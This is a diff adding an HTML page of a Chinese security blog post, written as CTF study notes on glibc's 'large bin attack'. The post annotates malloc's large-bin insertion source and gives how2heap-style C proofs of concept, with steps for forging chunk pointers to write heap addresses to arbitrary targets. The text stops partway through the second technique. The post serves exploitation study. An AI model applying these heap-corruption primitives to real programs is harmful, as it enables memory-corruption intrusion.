@@ -1,0 +1,740 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon/icon.jpg">
+  <link rel="icon" href="/img/favicon/icon.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Eurus">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="还是hgame（让我们说谢谢hgame），之前学的时候有看到过这个攻击方式，当时觉得很鸡肋，现在啪啪打脸━((*′д｀)爻(′д｀*))━!!!!">
+<meta property="og:type" content="article">
+<meta property="og:title" content="large bin attack">
+<meta property="og:url" content="http://akaieurus.github.io/2023/01/25/large-bin-attack/index.html">
+<meta property="og:site_name" content="Eurus禁止摆烂！">
+<meta property="og:description" content="还是hgame（让我们说谢谢hgame），之前学的时候有看到过这个攻击方式，当时觉得很鸡肋，现在啪啪打脸━((*′д｀)爻(′д｀*))━!!!!">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://akaieurus.github.io/img/posts/pc30.jpg">
+<meta property="article:published_time" content="2023-01-25T10:31:11.000Z">
+<meta property="article:modified_time" content="2025-01-03T10:18:29.998Z">
+<meta property="article:author" content="Eurus">
+<meta property="article:tag" content="how2heap">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://akaieurus.github.io/img/posts/pc30.jpg">
+  
+  
+  
+  <title>large bin attack - Eurus禁止摆烂！</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"akaieurus.github.io","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 100vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Eurus&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/posts/pc30.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="large bin attack"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-01-25 18:31" pubdate>
+          2023年1月25日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          17 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+        <div class="scroll-down-bar">
+          <i class="iconfont icon-arrowdown"></i>
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">large bin attack</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>还是hgame（让我们说谢谢hgame），之前学的时候有看到过这个攻击方式，当时觉得很鸡肋，现在啪啪打脸━((*′д｀)爻(′д｀*))━!!!!</p>
+<span id="more"></span>
+
+<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>large bin attack需要利用的是malloc里将chunk从unsorted bin摘除，放入large bin的过程，相关源码如下（ps：再放一遍largebin结构）（pps：chunk链的头结点的bk指向更大的chunk链的头节点，尾结点的fd指向更小的chunk链的头节点）：</p>
+<img src="/2023/01/25/large-bin-attack/large_bin.jpg" srcset="/img/loading.gif" lazyload class title="large_bin">
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><code class="hljs c">      <span class="hljs-keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))<br>	<span class="hljs-comment">//定位至unsorted bin的最后一个chunk一个个摘下直到unsorted bin没有chunk</span><br>        &#123;<br>          bck = victim-&gt;bk;<br>	<span class="hljs-comment">//筛去过大或过小的chunk</span><br>          <span class="hljs-keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>)<br>              || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="hljs-number">0</span>))<br>            malloc_printerr (check_action, <span class="hljs-string">&quot;malloc(): memory corruption&quot;</span>,<br>                             chunk2mem (victim), av);<br>          size = chunksize (victim);<br><br>				……<br><br>	<span class="hljs-comment">//从unsorted bin中摘下chunk的过程</span><br>          unsorted_chunks (av)-&gt;bk = bck;<br>          bck-&gt;fd = unsorted_chunks (av);<br><br>				……<br><br>          <span class="hljs-keyword">if</span> (in_smallbin_range (size))<br>            &#123;<br>				……<br>            &#125;<br>	<span class="hljs-comment">//放入large bin</span><br>          <span class="hljs-keyword">else</span><br>            &#123;<br>	<span class="hljs-comment">//计算index</span><br>              victim_index = largebin_index (size);<br>	<span class="hljs-comment">//bck定位至第一个chunk链（large bin数组）</span><br>              bck = bin_at (av, victim_index);<br>	<span class="hljs-comment">//fwd定位至第二个chunk链（最大的chunk链）</span><br>              fwd = bck-&gt;fd;<br><br>              <span class="hljs-comment">/* maintain large bins in sorted order */</span><br>              <span class="hljs-keyword">if</span> (fwd != bck)<span class="hljs-comment">//非空</span><br>                &#123;<br>                  <span class="hljs-comment">/* Or with inuse bit to speed comparisons */</span><br>                  size |= PREV_INUSE;<br>                  <span class="hljs-comment">/* if smaller than smallest, bypass loop below */</span><br>                  assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>                  <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &lt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (bck-&gt;bk-&gt;size))<br>	<span class="hljs-comment">//bck-&gt;bk定位至最后一个chunk链（最小的chunk链）</span><br>	<span class="hljs-comment">//如果victim比已有最小的chunk还小</span><br>                    &#123;<br>	<span class="hljs-comment">//fwd定位至第一个chunk链，bck定位至最后一个chunk链</span><br>                      fwd = bck;<br>                      bck = bck-&gt;bk;<br><br>	<span class="hljs-comment">//fd_nextsize指向最大的zhunk链，bk_nextsize指向最小的chunk链</span><br>                      victim-&gt;fd_nextsize = fwd-&gt;fd;<br>                      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;<br>	<span class="hljs-comment">//victim成为最小的chunk链和最大的chunk链连接</span><br>	<span class="hljs-comment">//原最小的chunk链和victim连接成为第二小的chunk链</span><br>                      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>                    &#125;<br>                  <span class="hljs-keyword">else</span><br>                    &#123;<br>                      assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>	<span class="hljs-comment">//fwd从大到小移动直至小于等于victim</span><br>                      <span class="hljs-keyword">while</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size &lt; fwd-&gt;size)<br>                        &#123;<br>                          fwd = fwd-&gt;fd_nextsize;<br>                          assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>                        &#125;<br><br>	<span class="hljs-comment">//如果vctim和fwd大小相等</span><br>                      <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size == (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) fwd-&gt;size)<br>                        <span class="hljs-comment">/* Always insert in the second position.  */</span><br>	<span class="hljs-comment">//fwd定位至该小chunk链的第二个chunk</span><br>                        fwd = fwd-&gt;fd;<br>	<span class="hljs-comment">//fwd是比victim小的最大的chunk链</span><br>                      <span class="hljs-keyword">else</span><br>                        &#123;<br>	<span class="hljs-comment">//chunk链连接同上</span><br>                          victim-&gt;fd_nextsize = fwd;<br>                          victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;<br>                          fwd-&gt;bk_nextsize = victim;<br>                          victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>                        &#125;<br>	<span class="hljs-comment">//bck定位至比victim大的第一个chunk链</span><br>                      bck = fwd-&gt;bk;<br>                    &#125;<br>                &#125;<br>              <span class="hljs-keyword">else</span><br>                victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;<br>            &#125;<br><br>	<span class="hljs-comment">//fwd是victim的fd，bck是victim的bk</span><br>          mark_bin (av, victim_index);<br>          victim-&gt;bk = bck;<br>          victim-&gt;fd = fwd;<br>          fwd-&gt;bk = victim;<br>          bck-&gt;fd = victim;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_ITERS       10000</span><br>          <span class="hljs-keyword">if</span> (++iters &gt;= MAX_ITERS)<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br></code></pre></td></tr></table></figure>
+<h1 id="利用一"><a href="#利用一" class="headerlink" title="利用一"></a>利用一</h1><p>这种利用方法利用的是第一个</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &lt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (bck-&gt;bk-&gt;size))<br></code></pre></td></tr></table></figure>
+
+<p>实现效果任意地址写一个堆地址<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41252520/article/details/126211062">实验代码</a>如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">size_t</span> g_Target = <span class="hljs-number">0xABCDEF20220807</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">char</span>* large_chunk1 = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x450</span>);<br>    <span class="hljs-type">char</span>* pad1 = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br>    <span class="hljs-type">char</span>* large_chunk2 = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x440</span>);<br>    <span class="hljs-type">char</span>* pad2 = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br><br>    <span class="hljs-built_in">free</span>(large_chunk1);<br>    <span class="hljs-type">char</span>* pad3 = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x500</span>);<br><br>    <span class="hljs-built_in">free</span>(large_chunk2);<br><br>    *(<span class="hljs-type">size_t</span>*)(large_chunk1+<span class="hljs-number">0x18</span>)=((<span class="hljs-type">size_t</span>)&amp;g_Target)<span class="hljs-number">-0x20</span>;<br>    <br>    <span class="hljs-type">char</span>* p1 = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+<ul>
+<li>先申请四个chunk，其中pad1、pad2用于隔离，防止合并</li>
+<li>释放chunk1进入unsorted bin</li>
+<li>申请pad3，unsorted bin中的chunk1放进large bin，此时chunk1的fd_nextsize和bk_nextsize都指向自己</li>
+<li>释放chunk2，chunk2进入unsorted bin</li>
+<li>更改chunk1的bk_nextsize为g_Target-0x20</li>
+<li>申请一个chunk，chunk2进入large bin。由于chunk2小于chunk1，执行以下代码：<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c">victim_index = largebin_index (size);<br>bck = bin_at (av, victim_index);<br>fwd = bck-&gt;fd;<br><br>……<br><br>fwd = bck;<br>bck = bck-&gt;bk;<span class="hljs-comment">//chunk1</span><br><br>victim-&gt;fd_nextsize = fwd-&gt;fd;<br><span class="hljs-comment">//chunk2-&gt;fd_nextsize=chunk1</span><br>victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;<br><span class="hljs-comment">//chunk2-&gt;bk_nextsize=chunk1-&gt;bk_nextsize=g_Target-0x20</span><br>fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br><span class="hljs-comment">//chunk1-&gt;bk_nextsize=chunk2</span><br><span class="hljs-comment">//(g_Target-0x20)-&gt;fd_nextsize=*g_Target=chunk2</span><br></code></pre></td></tr></table></figure></li>
+<li>更改成功<br>ps：示意图如下： <img src="/2023/01/25/large-bin-attack/1.jpg" srcset="/img/loading.gif" lazyload class title="步骤一">
+<img src="/2023/01/25/large-bin-attack/2.jpg" srcset="/img/loading.gif" lazyload class title="步骤二">
+<img src="/2023/01/25/large-bin-attack/3.jpg" srcset="/img/loading.gif" lazyload class title="步骤三"></li>
+</ul>
+<h2 id="利用步骤"><a href="#利用步骤" class="headerlink" title="利用步骤"></a>利用步骤</h2><ul>
+<li>malloc一块size1大小的large chunk（chunk1）</li>
+<li>malloc一块随便大小的chunk（防止合并）</li>
+<li>malloc一块size2大小的large chunk，要求size2&lt;size1且size1和size2在同一个large bin范围内</li>
+<li>malloc一块随便大小的chunk（防止合并）</li>
+<li>free（chunk1），chunk1进入unsorted bin</li>
+<li>malloc一块size3的large chunk，要求size3&gt;size1（不触发分割），chunk1进入large bin</li>
+<li>free（chunk2），chunk2进入unsorted bin</li>
+<li>修改chunk1-&gt;bk_nextsize&#x3D;Target-0x20</li>
+<li>malloc一块chunk（大小不等于size2），chunk2进入large bin，触发large bin attack</li>
+</ul>
+<h1 id="利用二"><a href="#利用二" class="headerlink" title="利用二"></a>利用二</h1><h2 id="2-30以前"><a href="#2-30以前" class="headerlink" title="2.30以前"></a>2.30以前</h2><p>这种方法利用的是第二个else，实现效果是任意地址写两个堆地址<br>实验代码如下（实验代码来源于how2heap代码，删除了一些输出）：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;assert.h&gt;</span></span><br> <br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> stack_var1 = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> stack_var2 = <span class="hljs-number">0</span>;<br><br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x420</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x500</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *p3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x500</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br> <br>    <span class="hljs-built_in">free</span>(p1);<br>    <span class="hljs-built_in">free</span>(p2);<br><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x90</span>);<br><br>    <span class="hljs-built_in">free</span>(p3);<br><br>    p2[<span class="hljs-number">-1</span>] = <span class="hljs-number">0x3f1</span>;<br>    p2[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>    p2[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span>;<br>    p2[<span class="hljs-number">1</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(&amp;stack_var1 - <span class="hljs-number">2</span>);<br>    p2[<span class="hljs-number">3</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(&amp;stack_var2 - <span class="hljs-number">4</span>);<br><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x90</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;stack_var1 (%p): %p\n&quot;</span>, &amp;stack_var1, (<span class="hljs-type">void</span> *)stack_var1);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;stack_var2 (%p): %p\n&quot;</span>, &amp;stack_var2, (<span class="hljs-type">void</span> *)stack_var2);<br><br>    <span class="hljs-comment">// sanity check</span><br>    assert(stack_var1 != <span class="hljs-number">0</span>);<br>    assert(stack_var2 != <span class="hljs-number">0</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+<ul>
+<li>malloc一个size1的chunk（chunk1）</li>
+<li>malloc随便一个chunk防止合并</li>
+<li>malloc一个size2的chunk（chunk2），要求size1&lt;size2</li>
+<li>malloc随便一个chunk防止合并</li>
+<li>malloc一个size3的chunk（chunk3），要求size2&lt;size3且在一个large bin的范围内</li>
+<li>malloc随便一个chunk防止合并</li>
+<li>free掉chunk1和chunk2，进入unsorted bin</li>
+<li>malloc一个size4的chunk，chunk1和chunk2先进入large bin，然后切割chunk1返回，剩下的chunk1_left被放入unsorted bin</li>
+<li>free掉chunk3，chunk3放进unsorted bin</li>
+<li>修改chunk2如下：<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c">修改前：<br>chunk2<br>size		-&gt; size2<br>fd			-&gt; large bin<br>bk			-&gt; large bin<br>fd_nextsize	-&gt; chunk2<br>bk_nextsize	-&gt; chunk2<br><br>修改后：<br>chunk2<br>size		-&gt; size2<br>fd			-&gt; null<br>bk			-&gt; target1<span class="hljs-number">-0x10</span><br>fd_nextsize	-&gt; null<br>bk_nextsize	-&gt; target2<span class="hljs-number">-0x20</span><br></code></pre></td></tr></table></figure></li>
+<li>随便malloc一个chunk，chunk1_left进入small bin，chunk3放进large bin，然后从chunk1_left中切割返回（剩下的放进unsorted bin）<br>重点分析下chunk3放进large bin这一步：<br>由于size2&lt;size3，所以chunk3会插入chunk2和large bin中间，执行else中的第二个else部分代码（如下）：<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c">victim_index = largebin_index (size);<br>bck = bin_at (av, victim_index);<span class="hljs-comment">//large bin</span><br>fwd = bck-&gt;fd;<span class="hljs-comment">//chunk2</span><br><br>……<br><br>victim-&gt;fd_nextsize = fwd;<br><span class="hljs-comment">//chunk3-&gt;fd_nextsize=chunk2</span><br>victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;<br><span class="hljs-comment">//chunk3-&gt;bk_nextsize=chunk2-&gt;bk_nextsize=target2-0x20</span><br>fwd-&gt;bk_nextsize = victim;<br><span 